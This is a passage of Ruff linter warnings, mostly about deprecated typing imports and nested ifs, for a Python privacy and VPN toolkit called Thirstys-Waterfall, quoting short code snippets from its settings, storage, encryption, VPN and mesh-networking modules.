  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\qa_system.py:52:10
   |
50 |     def submit_question(
51 |         self, question: str, category: str = "general"
52 |     ) -> Dict[str, Any]:
   |          ^^^^
53 |         """Submit a question (encrypted)"""
54 |         encrypted_q = self.god_tier_encryption.encrypt_god_tier(question.encode())
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\settings_manager.py:8:1
   |
 6 | import json
 7 | import logging
 8 | from typing import Any, Dict
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | from cryptography.fernet import Fernet
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\settings\settings_manager.py:257:46
    |
255 |             )
256 |
257 |     def get_category(self, category: str) -> Dict[str, Any]:
    |                                              ^^^^
258 |         """Get all settings in a category"""
259 |         return self.settings.get(category, {}).copy()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\settings\settings_manager.py:261:35
    |
259 |         return self.settings.get(category, {}).copy()
260 |
261 |     def get_all_settings(self) -> Dict[str, Dict[str, Any]]:
    |                                   ^^^^
262 |         """Get all settings"""
263 |         return self.settings.copy()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\settings\settings_manager.py:261:45
    |
259 |         return self.settings.get(category, {}).copy()
260 |
261 |     def get_all_settings(self) -> Dict[str, Dict[str, Any]]:
    |                                             ^^^^
262 |         """Get all settings"""
263 |         return self.settings.copy()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\settings\settings_manager.py:306:36
    |
304 |             self.logger.error(f"Failed to import settings: {e}")
305 |
306 |     def validate_settings(self) -> Dict[str, Any]:
    |                                    ^^^^
307 |         """Validate all settings for security and consistency"""
308 |         issues = []
    |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> external\Thirstys-Waterfall\thirstys_waterfall\settings\settings_manager.py:320:9
    |
318 |               issues.append("Ad blocker HOLY WAR mode is disabled!")
319 |
320 | /         if (
321 | |             self.settings["remote_access"]["browser_enabled"]
322 | |             or self.settings["remote_access"]["desktop_enabled"]
323 | |         ):
324 | |             if not self.settings["remote_access"]["require_authentication"]:
    | |____________________________________________________________________________^
325 |                   issues.append("Remote access enabled without authentication!")
    |
help: Combine `if` statements using `and`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\settings\settings_manager.py:329:29
    |
327 |         return {"valid": len(issues) == 0, "issues": issues, "warnings": len(issues)}
328 |
329 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
330 |         """Get settings manager status"""
331 |         validation = self.validate_settings()
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\storage\ephemeral_storage.py:5:1
  |
3 | import logging
4 | import time
5 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\storage\ephemeral_storage.py:14:32
   |
12 |     """
13 |
14 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
15 |         self.enabled = config.get("ephemeral_mode", True)
16 |         self.memory_only = config.get("memory_only", True)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\storage\ephemeral_storage.py:20:24
   |
18 |         self.logger = logging.getLogger(__name__)
19 |
20 |         self._storage: Dict[str, Dict[str, Any]] = {}
   |                        ^^^^
21 |         self._active = False
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\storage\ephemeral_storage.py:20:34
   |
18 |         self.logger = logging.getLogger(__name__)
19 |
20 |         self._storage: Dict[str, Dict[str, Any]] = {}
   |                                  ^^^^
21 |         self._active = False
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\storage\ephemeral_storage.py:34:48
   |
32 |         self._active = False
33 |
34 |     def store(self, key: str, value: Any, ttl: Optional[int] = None):
   |                                                ^^^^^^^^^^^^^
35 |         """
36 |         Store data temporarily.
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\storage\ephemeral_storage.py:50:37
   |
48 |         self.logger.debug(f"Stored ephemeral data: {key}")
49 |
50 |     def retrieve(self, key: str) -> Optional[Any]:
   |                                     ^^^^^^^^^^^^^
51 |         """
52 |         Retrieve ephemeral data.
   |
help: Convert to `X | None`

SIM102 Use a single `if` statement instead of nested `if` statements
  --> external\Thirstys-Waterfall\thirstys_waterfall\storage\ephemeral_storage.py:63:9
   |
62 |           # Check if expired
63 | /         if item["ttl"]:
64 | |             if time.time() - item["created"] > item["ttl"]:
   | |___________________________________________________________^
65 |                   self.delete(key)
66 |                   return None
   |
help: Combine `if` statements using `and`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\storage\ephemeral_storage.py:96:33
   |
94 |             self.logger.debug(f"Cleaned up {len(expired_keys)} expired items")
95 |
96 |     def get_statistics(self) -> Dict[str, Any]:
   |                                 ^^^^
97 |         """Get storage statistics"""
98 |         return {
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\storage\privacy_vault.py:5:1
  |
3 | import logging
4 | import os
5 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6 |
7 | from cryptography.fernet import Fernet
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\storage\privacy_vault.py:16:32
   |
14 |     """
15 |
16 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
17 |         self.enabled = config.get("privacy_vault_enabled", True)
18 |         self.encrypted = config.get("encrypted", True)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\storage\privacy_vault.py:22:22
   |
20 |         self.logger = logging.getLogger(__name__)
21 |
22 |         self._vault: Dict[str, bytes] = {}
   |                      ^^^^
23 |         self._cipher: Optional[Fernet] = None
24 |         self._active = False
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\storage\privacy_vault.py:23:23
   |
22 |         self._vault: Dict[str, bytes] = {}
23 |         self._cipher: Optional[Fernet] = None
   |                       ^^^^^^^^^^^^^^^^
24 |         self._active = False
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\storage\privacy_vault.py:26:37
   |
24 |         self._active = False
25 |
26 |     def start(self, encryption_key: Optional[bytes] = None):
   |                                     ^^^^^^^^^^^^^^^
27 |         """Start privacy vault"""
28 |         self.logger.info("Starting Privacy Vault")
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\storage\privacy_vault.py:69:37
   |
67 |         self.logger.debug(f"Stored encrypted data: {key}")
68 |
69 |     def retrieve(self, key: str) -> Optional[str]:
   |                                     ^^^^^^^^^^^^^
70 |         """
71 |         Retrieve and decrypt data from vault.
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\utils\doh_resolver.py:36:41
   |
34 |         self._active = False
35 |
36 |     def resolve(self, hostname: str) -> Optional[str]:
   |                                         ^^^^^^^^^^^^^
37 |         """
38 |         Resolve hostname using DNS-over-HTTPS.
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\utils\encrypted_logging.py:17:50
   |
15 |     """
16 |
17 |     def __init__(self, cipher: Fernet, log_file: Optional[str] = None):
   |                                                  ^^^^^^^^^^^^^
18 |         self._cipher = cipher
19 |         self._log_file = log_file
   |
help: Convert to `X | None`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\utils\encrypted_network.py:4:1
  |
3 | import logging
4 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | from cryptography.fernet import Fernet
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\utils\encrypted_network.py:38:40
   |
36 |         self._active = False
37 |
38 |     def encrypt_request(self, request: Dict[str, Any]) -> bytes:
   |                                        ^^^^
39 |         """
40 |         Encrypt outgoing network request.
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\utils\encrypted_network.py:64:62
   |
62 |         return encrypted_layer1
63 |
64 |     def decrypt_response(self, encrypted_response: bytes) -> Dict[str, Any]:
   |                                                              ^^^^
65 |         """
66 |         Decrypt incoming network response.
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\utils\encrypted_network.py:96:38
   |
94 |         return self._cipher.encrypt(hostname.encode())
95 |
96 |     def encrypt_packet(self, packet: Dict[str, Any]) -> bytes:
   |                                      ^^^^
97 |         """
98 |         Encrypt individual network packet.
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\utils\encrypted_network.py:104:58
    |
102 |         return self._cipher.encrypt(packet_bytes)
103 |
104 |     def decrypt_packet(self, encrypted_packet: bytes) -> Dict[str, Any]:
    |                                                          ^^^^
105 |         """Decrypt network packet"""
106 |         try:
    |
help: Replace with `dict`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> external\Thirstys-Waterfall\thirstys_waterfall\utils\god_tier_encryption.py:163:13
    |
161 |         except Exception as e:
162 |             self.logger.error(f"GOD TIER decryption failed: {e}")
163 |             raise ValueError("Decryption failed - data may be corrupted or tampered")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
164 |
165 |     def _encrypt_aes_gcm(self, data: bytes) -> bytes:
    |

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:12:1
   |
10 | import time
11 | from abc import ABC, abstractmethod
12 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:12:1
   |
10 | import time
11 | from abc import ABC, abstractmethod
12 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:18:32
   |
16 |     """Abstract base class for VPN backend implementations"""
17 |
18 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
19 |         self.config = config
20 |         self.logger = logging.getLogger(self.__class__.__name__)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:35:29
   |
34 |     @abstractmethod
35 |     def get_status(self) -> Dict[str, Any]:
   |                             ^^^^
36 |         """Get connection status"""
37 |         pass
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:51:32
   |
49 |     """
50 |
51 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
52 |         super().__init__(config)
53 |         self.interface_name = config.get("interface", "wg0")
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:197:29
    |
195 |             return False
196 |
197 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
198 |         """Get WireGuard connection status"""
199 |         status = {
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:231:32
    |
229 |     """
230 |
231 |     def __init__(self, config: Dict[str, Any]):
    |                                ^^^^
232 |         super().__init__(config)
233 |         self.config_file = config.get("config_file", "/etc/openvpn/client.conf")
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:301:29
    |
299 |             return False
300 |
301 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
302 |         """Get OpenVPN status"""
303 |         return {
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:318:32
    |
316 |     """
317 |
318 |     def __init__(self, config: Dict[str, Any]):
    |                                ^^^^
319 |         super().__init__(config)
320 |         self.connection_name = config.get("connection_name", "ThirstysVPN")
    |
help: Replace with `dict`

SIM210 Remove unnecessary `True if ... else False`
   --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:416:23
    |
414 |                 capture_output=True,
415 |                 timeout=30,
416 |                 shell=True if self.platform == "Windows" else False,
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
417 |             )
    |
help: Remove unnecessary `True if ... else False`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:430:29
    |
428 |             return False
429 |
430 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
431 |         """Get IKEv2 status"""
432 |         return {
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:444:47
    |
443 |     @staticmethod
444 |     def create_backend(protocol: str, config: Dict[str, Any]) -> Optional[VPNBackend]:
    |                                               ^^^^
445 |         """
446 |         Create VPN backend based on protocol
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:444:66
    |
443 |     @staticmethod
444 |     def create_backend(protocol: str, config: Dict[str, Any]) -> Optional[VPNBackend]:
    |                                                                  ^^^^^^^^^^^^^^^^^^^^
445 |         """
446 |         Create VPN backend based on protocol
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\backends.py:468:37
    |
467 |     @staticmethod
468 |     def get_available_backends() -> List[str]:
    |                                     ^^^^
469 |         """
470 |         Get list of available VPN backends on this system
    |
help: Replace with `list`

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\dns_protection.py:4:1
  |
3 | import logging
4 | from typing import List
  | ^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\dns_protection.py:58:34
   |
56 |         self._active = False
57 |
58 |     def _get_system_dns(self) -> List[str]:
   |                                  ^^^^
59 |         """Get current system DNS servers"""
60 |         # In production, would read from /etc/resolv.conf or registry
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\dns_protection.py:63:41
   |
61 |         return ["8.8.8.8", "8.8.4.4"]
62 |
63 |     def _set_dns_servers(self, servers: List[str]):
   |                                         ^^^^
64 |         """Set system DNS servers"""
65 |         self.logger.debug(f"Setting DNS servers: {servers}")
   |
help: Replace with `list`

UP035 [*] Import from `collections.abc` instead: `Callable`
 --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\kill_switch.py:5:1
  |
3 | import logging
4 | import threading
5 | from typing import Callable, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |
help: Import from `collections.abc`

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\kill_switch.py:5:1
  |
3 | import logging
4 | import threading
5 | from typing import Callable, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\kill_switch.py:18:26
   |
16 |         self.logger = logging.getLogger(__name__)
17 |         self._active = False
18 |         self._callbacks: List[Callable] = []
   |                          ^^^^
19 |         self._lock = threading.Lock()
20 |         self._monitoring = False
   |
help: Replace with `list`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:4:1
  |
3 | import logging
4 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:4:1
  |
3 | import logging
4 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:26:34
   |
24 |         ]
25 |
26 |     def establish_route(self) -> List[Dict[str, Any]]:
   |                                  ^^^^
27 |         """
28 |         Establish multi-hop route through VPN nodes.
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:26:39
   |
24 |         ]
25 |
26 |     def establish_route(self) -> List[Dict[str, Any]]:
   |                                       ^^^^
27 |         """
28 |         Establish multi-hop route through VPN nodes.
   |
help: Replace with `dict`

B007 Loop control variable `i` not used within loop body
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:36:13
   |
34 |         available_nodes = self._nodes.copy()
35 |
36 |         for i in range(min(self.hop_count, len(available_nodes))):
   |             ^
37 |             # Select best node (lowest load, geographically diverse)
38 |             node = self._select_next_node(available_nodes, route)
   |
help: Rename unused `i` to `_i`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:46:32
   |
45 |     def _select_next_node(
46 |         self, available_nodes: List[Dict[str, Any]], current_route: List[Dict[str, Any]]
   |                                ^^^^
47 |     ) -> Dict[str, Any]:
48 |         """Select next node for route"""
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:46:37
   |
45 |     def _select_next_node(
46 |         self, available_nodes: List[Dict[str, Any]], current_route: List[Dict[str, Any]]
   |                                     ^^^^
47 |     ) -> Dict[str, Any]:
48 |         """Select next node for route"""
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:46:69
   |
45 |     def _select_next_node(
46 |         self, available_nodes: List[Dict[str, Any]], current_route: List[Dict[str, Any]]
   |                                                                     ^^^^
47 |     ) -> Dict[str, Any]:
48 |         """Select next node for route"""
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:46:74
   |
45 |     def _select_next_node(
46 |         self, available_nodes: List[Dict[str, Any]], current_route: List[Dict[str, Any]]
   |                                                                          ^^^^
47 |     ) -> Dict[str, Any]:
48 |         """Select next node for route"""
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:47:10
   |
45 |     def _select_next_node(
46 |         self, available_nodes: List[Dict[str, Any]], current_route: List[Dict[str, Any]]
47 |     ) -> Dict[str, Any]:
   |          ^^^^
48 |         """Select next node for route"""
49 |         # Score nodes based on load and geographic diversity
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:68:30
   |
67 |     def optimize_route(
68 |         self, current_route: List[Dict[str, Any]]
   |                              ^^^^
69 |     ) -> List[Dict[str, Any]]:
70 |         """Optimize existing route for better performance"""
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:68:35
   |
67 |     def optimize_route(
68 |         self, current_route: List[Dict[str, Any]]
   |                                   ^^^^
69 |     ) -> List[Dict[str, Any]]:
70 |         """Optimize existing route for better performance"""
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:69:10
   |
67 |     def optimize_route(
68 |         self, current_route: List[Dict[str, Any]]
69 |     ) -> List[Dict[str, Any]]:
   |          ^^^^
70 |         """Optimize existing route for better performance"""
71 |         # Check if route needs optimization
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:69:15
   |
67 |     def optimize_route(
68 |         self, current_route: List[Dict[str, Any]]
69 |     ) -> List[Dict[str, Any]]:
   |               ^^^^
70 |         """Optimize existing route for better performance"""
71 |         # Check if route needs optimization
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:81:30
   |
79 |         return current_route
80 |
81 |     def add_node(self, node: Dict[str, Any]):
   |                              ^^^^
82 |         """Add new VPN node to pool"""
83 |         self._nodes.append(node)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:89:38
   |
87 |         self._nodes = [n for n in self._nodes if n["id"] != node_id]
88 |
89 |     def get_available_nodes(self) -> List[Dict[str, Any]]:
   |                                      ^^^^
90 |         """Get list of available nodes"""
91 |         return self._nodes.copy()
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\multi_hop.py:89:43
   |
87 |         self._nodes = [n for n in self._nodes if n["id"] != node_id]
88 |
89 |     def get_available_nodes(self) -> List[Dict[str, Any]]:
   |                                           ^^^^
90 |         """Get list of available nodes"""
91 |         return self._nodes.copy()
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\vpn_manager.py:6:1
  |
4 | import threading
5 | import time
6 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 |
8 | from cryptography.fernet import Fernet
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\vpn_manager.py:23:32
   |
21 |     """
22 |
23 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
24 |         self.config = config
25 |         self.logger = logging.getLogger(__name__)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\vpn_manager.py:106:39
    |
104 |         self.logger.info("VPN connection established")
105 |
106 |     def _connect_single_node(self) -> Dict[str, Any]:
    |                                       ^^^^
107 |         """Connect to single VPN node"""
108 |         # Try protocols in fallback order
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\vpn_manager.py:119:56
    |
117 |         raise ConnectionError("All VPN protocols failed")
118 |
119 |     def _connect_with_protocol(self, protocol: str) -> Dict[str, Any]:
    |                                                        ^^^^
120 |         """Connect using specific protocol"""
121 |         # Simulate protocol connection
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\vpn_manager.py:172:29
    |
170 |             return b""
171 |
172 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
173 |         """Get VPN status"""
174 |         return {
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\vpn\vpn_manager.py:192:33
    |
190 |         return self._connected
191 |
192 |     def get_current_ip(self) -> Optional[str]:
    |                                 ^^^^^^^^^^^^^
193 |         """Get current exit IP"""
194 |         if self._current_route:
    |
help: Convert to `X | None`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:9:1
  |
7 | from dataclasses import dataclass
8 | from enum import Enum
9 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:9:1
  |
7 | from dataclasses import dataclass
8 | from enum import Enum
9 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:30:22
   |
28 |     hop_count: int  # Hops to root
29 |     bandwidth_mbps: int
30 |     connected_peers: List[str]
   |                      ^^^^
31 |     is_gateway: bool
32 |     uptime_seconds: int
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:53:32
   |
51 |     """
52 |
53 |     def __init__(self, config: Optional[Dict[str, Any]] = None):
   |                                ^^^^^^^^^^^^^^^^^^^^^^^^
54 |         self.config = config or {}
55 |         self.logger = logging.getLogger(self.__class__.__name__)
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:53:41
   |
51 |     """
52 |
53 |     def __init__(self, config: Optional[Dict[str, Any]] = None):
   |                                         ^^^^
54 |         self.config = config or {}
55 |         self.logger = logging.getLogger(self.__class__.__name__)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:63:21
   |
62 |         # Mesh topology
63 |         self.nodes: Dict[str, MeshNode] = {}
   |                     ^^^^
64 |         self.my_node_id: Optional[str] = None
65 |         self.root_node_id: Optional[str] = None
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:64:26
   |
62 |         # Mesh topology
63 |         self.nodes: Dict[str, MeshNode] = {}
64 |         self.my_node_id: Optional[str] = None
   |                          ^^^^^^^^^^^^^
65 |         self.root_node_id: Optional[str] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:65:28
   |
63 |         self.nodes: Dict[str, MeshNode] = {}
64 |         self.my_node_id: Optional[str] = None
65 |         self.root_node_id: Optional[str] = None
   |                            ^^^^^^^^^^^^^
66 |
67 |         # Routing table
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:68:29
   |
67 |         # Routing table
68 |         self.routing_table: Dict[str, List[str]] = {}  # destination -> path
   |                             ^^^^
69 |
70 |         # Bandwidth pooling for marketplace
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:68:39
   |
67 |         # Routing table
68 |         self.routing_table: Dict[str, List[str]] = {}  # destination -> path
   |                                       ^^^^
69 |
70 |         # Bandwidth pooling for marketplace
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:167:57
    |
165 |             self.logger.error(f"Routing table update failed: {e}")
166 |
167 |     def _calculate_best_path(self, destination: str) -> Optional[List[str]]:
    |                                                         ^^^^^^^^^^^^^^^^^^^
168 |         """
169 |         Calculate best path to destination using airtime metric
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:167:66
    |
165 |             self.logger.error(f"Routing table update failed: {e}")
166 |
167 |     def _calculate_best_path(self, destination: str) -> Optional[List[str]]:
    |                                                                  ^^^^
168 |         """
169 |         Calculate best path to destination using airtime metric
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:209:34
    |
207 |             self._update_routing_table()
208 |
